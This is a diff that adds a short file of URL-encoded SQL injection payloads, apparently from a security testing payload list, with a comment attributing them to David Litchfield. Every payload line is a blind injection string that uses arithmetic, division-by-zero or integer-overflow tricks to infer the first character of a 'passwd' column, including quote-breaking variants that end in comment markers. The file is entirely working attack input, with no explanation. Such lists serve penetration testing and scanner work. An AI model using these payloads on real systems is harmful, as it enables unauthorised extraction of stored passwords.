@@ -1,0 +1,11 @@
+# Not sure of original source
+#  attributed to David Litchfield
+#
+234+%2B+%281+%2F+ASCII%28substring%28passwd%2C1%2C1%29%29-4%29
+foo%27+%2B+%281+%2F+ASCII%28substring%28passwd%2C1%2C1%29%29-4%29--
+
+456+%2B+ASCII%28substring%28passwd%2C1%2C1%29%29-10
+foo%27%2B+ASCII%28substring%28passwd%2C1%2C1%29%29-10--
+
+# overflow
+123%2B+%28%280+%2F+ascii%28substring%28passwd%2C1%2C1%29%29+%2A+4294967296%29
